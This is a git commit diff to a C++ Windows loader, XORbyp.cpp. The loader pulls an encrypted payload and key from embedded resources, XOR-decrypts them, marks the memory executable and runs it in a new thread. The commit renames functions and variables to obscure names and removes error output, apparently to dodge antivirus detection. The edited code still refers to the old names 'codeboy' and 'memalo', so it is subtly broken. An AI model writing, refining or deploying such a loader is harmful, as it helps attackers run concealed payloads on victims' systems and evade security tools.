cb7d5b06b563b547119f77168a666f0415f4f601
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-27 14:02:46 -0500

    Update XORbyp.cpp

--- XORbyp.cpp
+++ XORbyp.cpp
@@ -4,13 +4,9 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void DataLoadBaby(const char* resName, char** data, DWORD* size) {
+void loaditon(const char* resName, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
-    if (!hResource) {
-        printf("Resource %s not found!\n", resName);
-        exit(1);
-    }
 
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
@@ -23,9 +19,9 @@ void DataLoadBaby(const char* resName, char** data, DWORD* size) {
 
 
 
-void DecryptXOR(char* codeboy, DWORD codeboyLen, unsigned char* key, DWORD keyLen) {
-    for (DWORD i = 0; i < codeboyLen; i++) {
-        codeboy[i] ^= key[i % keyLen]; // XOR with the key in a repeating fashion
+void XODEC(char* c1o2deboy, DWORD c1o2deboylen, unsigned char* k1e2y, DWORD k1e2ylen) {
+    for (DWORD da = 0; da < c1o2deboylen; da++) {
+        codeboy[da] ^= k1e2y[da % k1e2ylen];
     }
 }
 
@@ -35,21 +31,21 @@ int main() {
 
     char* AESkey;
     DWORD AESkeyLen;
-    DataLoadBaby("AESKEY", &AESkey, &AESkeyLen);
+    loaditon("AESKEY", &AESkey, &AESkeyLen);
 
     char* AESCode;
     DWORD AESCodeLen;
-    DataLoadBaby("AESCODE", &AESCode, &AESCodeLen);
+    loaditon("AESCODE", &AESCode, &AESCodeLen);
 
-    LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
+    LPVOID camllo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
     //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
-    DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);
+    XODEC(AESCode, AESCodeLen, AESkey , AESkeyLen);
 
-    memcpy(memalo, AESCode, AESCodeLen);
+    memcpy(camllo, AESCode, AESCodeLen);
     DWORD oldProtect;
     VirtualProtect(memalo, AESCodeLen, PAGE_EXECUTE_READ, &oldProtect);
 
-    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
+    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)camllo, NULL, 0, NULL);
     WaitForSingleObject(tHandle, INFINITE);
 
     return 0;
